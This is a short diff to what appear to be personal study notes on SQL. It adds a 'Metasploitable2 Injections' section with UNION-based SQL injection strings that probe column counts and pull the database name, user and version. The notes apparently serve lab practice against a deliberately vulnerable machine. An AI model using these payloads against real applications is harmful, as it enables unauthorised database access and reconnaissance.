@@ -95,3 +95,10 @@ CREATE TABLE accounts (
     password VARCHAR(100) NOT NULL
 );
 ```
+### Metasploitable2 Injections
+```
+' union select 1,2,3 #
+' union select database(),user(),version() #
+# same as
+select database(); # at mysql terminal
+```
